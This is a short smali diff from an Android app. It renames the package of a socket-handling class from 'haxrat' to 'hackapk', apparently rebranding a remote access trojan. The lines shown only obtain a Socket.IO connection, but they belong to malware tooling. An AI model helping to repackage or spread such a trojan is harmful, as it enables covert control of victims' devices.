@@ -159,11 +159,11 @@
     move-result-object v7
 
     .line 65
-    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/justhack/hackapk/IOSocket;
 
     move-result-object v7
 
-    invoke-virtual {v7}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v7}, Lcom/justhack/hackapk/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v7
 
